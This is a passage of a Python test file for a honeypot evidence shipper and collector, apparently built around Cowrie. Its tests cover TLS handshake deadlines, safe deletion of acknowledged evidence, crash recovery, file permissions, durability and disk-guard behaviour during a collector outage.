    store.settings.request_deadline_seconds = 0.5
    store.settings.idle_timeout_seconds = 5  # each byte arrives well inside this
    srv = start_tls_server(store, tls_files)
    try:
        host, port = srv.server_address
        s = socket.create_connection((host, port), timeout=5)
        started = time.monotonic()
        # A TLS record header announcing a 512-byte ClientHello, then a byte at a time.
        closed = False
        for b in bytes([0x16, 0x03, 0x01, 0x02, 0x00]) + b"\x01" * 512:
            try:
                s.send(bytes([b]))
            except OSError:
                closed = True
                break
            time.sleep(0.05)
            if time.monotonic() - started > 4:
                break
        if not closed:
            s.settimeout(1)
            try:
                closed = s.recv(1) == b""
            except OSError:
                closed = True
        elapsed = time.monotonic() - started
        assert closed, "slow handshake was never cut off"
        assert elapsed < 2.5, f"cut off after {elapsed:.1f}s, deadline was 0.5s"
    finally:
        stop_server(srv)


def test_shipper_works_over_tls(store, tls_files, cowrie, tmp_path, sensor_key):
    srv = start_tls_server(store, tls_files)
    try:
        host, port = srv.server_address
        (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
        shipper = Shipper(
            Config(
                sensor_id="sensor-1",
                key=sensor_key,
                collector_url=f"https://localhost:{port}",
                log_dir=cowrie / "log",
                state_path=tmp_path / "state.json",
                dead_letter_dir=tmp_path / "dead-letter",
                ca_file=str(tls_files[0]),
            )
        )
        assert shipper.run_once() == 1
        assert len(store.list()) == 1
    finally:
        stop_server(srv)


# --- sensor-side evidence lifecycle ---------------------------------------------


def cleaning_shipper(server, cowrie, tmp_path, key):
    shipper = make_shipper(server, cowrie, tmp_path, key)
    shipper.config.delete_acknowledged = True
    shipper.config.rotated_log_settle_seconds = 0
    return shipper


def seed_spool(cowrie):
    tty = cowrie / "tty" / ("ab" * 32)
    tty.write_bytes(b"tty with typed password")
    payload = b"#!/bin/sh\necho payload\n"
    dl = cowrie / "downloads" / hashlib.sha256(payload).hexdigest()
    dl.write_bytes(payload)
    rotated = cowrie / "log" / "cowrie.json.2026-11-17"
    rotated.write_bytes(line(LOGIN) + line(COMMAND))
    live = cowrie / "log" / "cowrie.json"
    live.write_bytes(line({"eventid": "cowrie.session.connect"}))
    return tty, dl, rotated, live


def test_acknowledged_evidence_is_removed_from_the_sensor(server, store, cowrie, tmp_path, sensor_key):
    tty, dl, rotated, live = seed_spool(cowrie)
    assert cleaning_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 5
    assert len(store.list()) == 5
    assert not tty.exists() and not dl.exists() and not rotated.exists()
    assert live.exists()  # Cowrie is still writing it
    state = json.loads((tmp_path / "shipper-state.json").read_text())
    assert state["acked"] == [] and list(state["offsets"]) != []  # only the live log is tracked


def test_nothing_is_removed_without_the_option(server, cowrie, tmp_path, sensor_key):
    files = seed_spool(cowrie)
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert all(f.exists() for f in files)


def test_unreachable_collector_never_causes_deletion(store, cowrie, tmp_path, sensor_key):
    files = seed_spool(cowrie)
    srv = start_server(store)
    shipper = cleaning_shipper(srv, cowrie, tmp_path, sensor_key)
    stop_server(srv)
    with pytest.raises(ShipError):
        shipper.run_once()
    assert all(f.exists() for f in files)


def test_lost_reply_never_causes_deletion(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    """The collector stores the evidence but the reply is lost (connection
    reset): the shipper must treat it as not acknowledged."""
    import urllib.request as ur

    tty = cowrie / "tty" / ("cd" * 32)
    tty.write_bytes(b"recording")
    real = ur.urlopen

    def stored_then_reset(*a, **k):
        with real(*a, **k):
            pass
        raise ConnectionResetError("reply lost")

    monkeypatch.setattr(ur, "urlopen", stored_then_reset)
    shipper = cleaning_shipper(server, cowrie, tmp_path, sensor_key)
    with pytest.raises(ShipError):
        shipper.run_once()
    assert len(store.list()) == 1 and tty.exists()
    monkeypatch.setattr(ur, "urlopen", real)
    shipper.run_once()  # resend: the collector answers "duplicate", which is an acknowledgement
    assert len(store.list()) == 1 and not tty.exists()


def test_partly_shipped_rotated_log_is_kept(store, cowrie, tmp_path, sensor_key, monkeypatch):
    rotated = cowrie / "log" / "cowrie.json.2026-11-17"
    rotated.write_bytes(line(LOGIN) + line(COMMAND))
    srv = start_server(store)
    try:
        shipper = cleaning_shipper(srv, cowrie, tmp_path, sensor_key)
        calls = {"n": 0}
        real_send = shipper.send

        def fail_second(*a, **k):
            calls["n"] += 1
            if calls["n"] == 2:
                raise ShipError("collector went away")
            return real_send(*a, **k)

        monkeypatch.setattr(shipper, "send", fail_second)
        with pytest.raises(ShipError):
            shipper.run_once()
        assert rotated.exists() and len(store.list()) == 1
        monkeypatch.setattr(shipper, "send", real_send)
        shipper.run_once()
        assert not rotated.exists() and len(store.list()) == 2
    finally:
        stop_server(srv)


def test_crash_between_ack_and_delete_finishes_on_restart(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    tty = cowrie / "tty" / ("ef" * 32)
    tty.write_bytes(b"recording")

    def crash(self, missing_ok=False):
        raise RuntimeError("killed")

    monkeypatch.setattr(Path, "unlink", crash)
    with pytest.raises(RuntimeError):
        cleaning_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    monkeypatch.undo()
    assert tty.exists()
    # A fresh process reads the saved acknowledgement and removes the file
    # without sending it again.
    restarted = cleaning_shipper(server, cowrie, tmp_path, sensor_key)
    assert restarted.run_once() == 0
    assert not tty.exists() and len(store.list()) == 1


def test_crash_before_ack_is_saved_resends_instead_of_deleting(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    from bearjug.shipper import State

    tty = cowrie / "tty" / ("12" * 32)
    tty.write_bytes(b"recording")

    def crash(self, path):
        raise RuntimeError("killed before the state was written")

    monkeypatch.setattr(State, "save", crash)
    with pytest.raises(RuntimeError):
        cleaning_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    monkeypatch.undo()
    assert tty.exists() and len(store.list()) == 1
    cleaning_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert not tty.exists() and len(store.list()) == 1


def test_refused_evidence_leaves_the_spool_only_once_preserved(server, cowrie, tmp_path, sensor_key):
    shipper = cleaning_shipper(server, cowrie, tmp_path, sensor_key)
    preserved = cowrie / "downloads" / hashlib.sha256(b"original").hexdigest()
    preserved.write_bytes(b"tampered")  # refused: digest mismatch, copied to dead-letter
    shipper.run_once()
    assert not preserved.exists()
    assert list((tmp_path / "dead-letter").glob("*.bin"))

    shipper.dead_letter.max_bytes = 0  # dead-letter full: bytes can't be preserved
    unpreserved = cowrie / "downloads" / hashlib.sha256(b"original2").hexdigest()
    unpreserved.write_bytes(b"tampered2")
    shipper.run_once()
    assert unpreserved.exists()  # still the only copy
    marker = f"upload:{unpreserved.name}"
    shipper.state.unpreserved[marker] -= 31 * 86400
    shipper.state.save(shipper.config.state_path)
    shipper.run_once()
    assert not unpreserved.exists()  # its retention period is over


def test_spool_size_warning(server, cowrie, tmp_path, sensor_key, caplog):
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.config.spool_warn_bytes = 10
    (cowrie / "tty" / ("34" * 32)).write_bytes(b"x" * 100)
    with caplog.at_level("WARNING", logger="bearjug.shipper"):
        shipper.run_once()
    assert "over the 0 MiB warning level" in caplog.text


def test_world_readable_spool_is_reported(server, cowrie, tmp_path, sensor_key, caplog):
    tty = cowrie / "tty" / ("56" * 32)
    tty.write_bytes(b"x")
    tty.chmod(0o644)
    with caplog.at_level("WARNING", logger="bearjug.shipper"):
        make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert "accessible to other users" in caplog.text


# --- permissions are set by the code, not the umask -----------------------------


def test_permissions_do_not_depend_on_the_umask(tmp_path, server, cowrie, sensor_key):
    old = os.umask(0)
    try:
        data = tmp_path / "loose-collector"
        init_data_dir(data)
        s = Store(data)
        s.add_sensor("sensor-x", actor="t")
        body = line(COMMAND)[:-1]
        _, eid = s.ingest(meta_for(body, sensor_id="sensor-x"), body)
        cli.main(["--data", str(data), "add-sensor", "sensor-y", "--key-out", str(tmp_path / "y.key")])

        shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
        shipper.config.dead_letter_dir = tmp_path / "dl-loose"
        from bearjug.shipper import DeadLetter

        shipper.dead_letter = DeadLetter(tmp_path / "dl-loose", max_bytes=1 << 20, retention_days=1)
        (cowrie / "log" / "cowrie.json").write_bytes(b"bad\n")
        shipper.run_once()
    finally:
        os.umask(old)

    def mode(p):
        return stat.S_IMODE(p.stat().st_mode)

    assert mode(data) == 0o700
    assert mode(data / "blobs") == 0o700
    assert mode(s._blob_path(eid).parent) == 0o700
    assert mode(s._blob_path(eid)) == 0o600
    for name in ("config.json", "evidence-keys.json", "sensors.json", "evidence.db"):
        assert mode(data / name) == 0o600, name
    assert mode(tmp_path / "y.key") == 0o600
    assert mode(tmp_path / "shipper-state.json") == 0o600
    assert mode(tmp_path / "dl-loose") == 0o700
    assert {mode(p) for p in (tmp_path / "dl-loose").iterdir()} == {0o600}


# --- cleanup only removes the exact file that was acknowledged -----------------


def test_replaced_file_is_not_deleted_on_another_files_ack(server, store, cowrie, tmp_path, sensor_key):
    name = "ab" * 32
    tty = cowrie / "tty" / name
    tty.write_bytes(b"recording A")
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.run_once()  # A acknowledged, but cleanup is off
    # Something on the sensor swaps a different file in at the same name.
    swap = cowrie / "tty" / "incoming"
    swap.write_bytes(b"recording B, never shipped")
    os.replace(swap, tty)
    shipper.config.delete_acknowledged = True
    shipper.run_once()
    assert tty.read_bytes() == b"recording B, never shipped"


def test_file_rewritten_in_place_is_not_deleted(server, cowrie, tmp_path, sensor_key):
    tty = cowrie / "tty" / ("cd" * 32)
    tty.write_bytes(b"recording A")
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.run_once()
    time.sleep(0.01)
    tty.write_bytes(b"recording C")  # same inode, same size, new mtime
    shipper.config.delete_acknowledged = True
    shipper.run_once()
    assert tty.exists()


def test_symlink_swapped_in_is_not_followed_or_deleted(server, cowrie, tmp_path, sensor_key):
    tty = cowrie / "tty" / ("ef" * 32)
    tty.write_bytes(b"recording")
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.run_once()
    target = tmp_path / "elsewhere"
    target.write_bytes(b"not evidence")
    tty.unlink()
    tty.symlink_to(target)
    shipper.config.delete_acknowledged = True
    shipper.run_once()
    assert tty.is_symlink() and target.exists()


def test_replaced_rotated_log_is_not_deleted(server, store, cowrie, tmp_path, sensor_key):
    rotated = cowrie / "log" / "cowrie.json.2026-11-17"
    rotated.write_bytes(line(LOGIN))
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.config.rotated_log_settle_seconds = 0
    shipper.run_once()
    # Rewritten in place with the same length: same device and inode, so the
    # progress marker matches, but it is not the file that was read.
    time.sleep(0.01)
    data = line(LOGIN)
    rotated.write_bytes(data.replace(b"postgres", b"postgrex"))
    shipper.config.delete_acknowledged = True
    # Stop this pass from re-reading the file, so only cleanup acts on it.
    shipper.ship_json_logs = lambda: 0
    shipper.run_once()
    assert rotated.exists()


# --- durability -----------------------------------------------------------------


def test_state_and_key_writes_sync_their_directory(tmp_path, monkeypatch):
    from bearjug import fsutil

    synced = []
    real = fsutil.fsync_dir
    monkeypatch.setattr(fsutil, "fsync_dir", lambda p: (synced.append(Path(p)), real(p)))
    fsutil.write_private(tmp_path / "state.json", b"{}")
    assert synced == [tmp_path]
    assert (tmp_path / "state.json").read_bytes() == b"{}"
    with pytest.raises(FileExistsError):
        fsutil.write_private(tmp_path / "state.json", b"x", exclusive=True)
    assert not (tmp_path / "state.json.tmp").exists()


def test_cleanup_and_blob_writes_sync_their_directories(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    import bearjug.collector.store as store_mod
    import bearjug.shipper as shipper_mod

    synced = []
    real = shipper_mod.fsync_dir

    def spy(p):
        synced.append(Path(p))
        real(p)

    monkeypatch.setattr(shipper_mod, "fsync_dir", spy)
    monkeypatch.setattr(store_mod, "fsync_dir", spy)
    (cowrie / "tty" / ("12" * 32)).write_bytes(b"recording")
    cleaning_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert cowrie / "tty" in synced  # the deletion was made durable
    [row] = store.list()
    assert store._blob_path(row["evidence_id"]).parent in synced  # blob durable before its record


# --- collector outage, disk guard and recovery, end to end ---------------------


def test_collector_outage_stops_cowrie_and_recovers_without_losing_evidence(store, cowrie, tmp_path, sensor_key):
    from bearjug.diskguard import DiskGuard, GuardConfig

    commands = []
    usage = {"pct": 50.0}
    srv = start_server(store)
    host, port = srv.server_address
    shipper = cleaning_shipper(srv, cowrie, tmp_path, sensor_key)
    guard = DiskGuard(
        GuardConfig(
            evidence_dir=cowrie,
            shipper_health=shipper.health_path,
            state_path=tmp_path / "guard.json",
            stop_command=["stop"],
            start_command=["start"],
            allow_shared_filesystem=True,
        ),
        usage=lambda p: usage["pct"],
        runner=lambda argv: commands.append(argv[0]) or True,
    )

    # Normal running: evidence is shipped and removed, shipping is healthy.
    (cowrie / "tty" / ("aa" * 32)).write_bytes(b"session 1")
    assert shipper.run_once() == 1
    assert guard.check() == "ok"

    # The collector goes away. Evidence piles up and is all kept.
    stop_server(srv)
    for i in range(3):
        (cowrie / "tty" / (f"{i}" * 64)).write_bytes(b"unacknowledged session %d" % i)
    with pytest.raises(ShipError):
        shipper.run_once()
    assert len(list((cowrie / "tty").iterdir())) == 3
    assert json.loads(shipper.health_path.read_text())["ok"] is False

    usage["pct"] = 82
    assert guard.check() == "stopped" and commands == ["stop"]
    # Space comes back (an operator cleared something else), but the collector
    # is still down: Cowrie stays stopped and the evidence stays put.
    usage["pct"] = 50
    with pytest.raises(ShipError):
        shipper.run_once()
    assert guard.check() == "held"
    assert len(list((cowrie / "tty").iterdir())) == 3

    # The collector comes back on the same address; the backlog is delivered
    # and removed, shipping is healthy, Cowrie resumes.
    srv2 = CollectorServer((host, port), store)
    threading.Thread(target=srv2.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()
    try:
        assert shipper.run_once() == 3
        assert list((cowrie / "tty").iterdir()) == []
        assert guard.check() == "resumed" and commands == ["stop", "start"]
        assert len(store.list()) == 4
    finally:
        stop_server(srv2)


def test_idle_shipper_still_proves_the_collector_is_reachable(server, cowrie, tmp_path, sensor_key):
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 0
    assert json.loads(shipper.health_path.read_text())["ok"] is True
    assert stat.S_IMODE(shipper.health_path.stat().st_mode) == 0o600
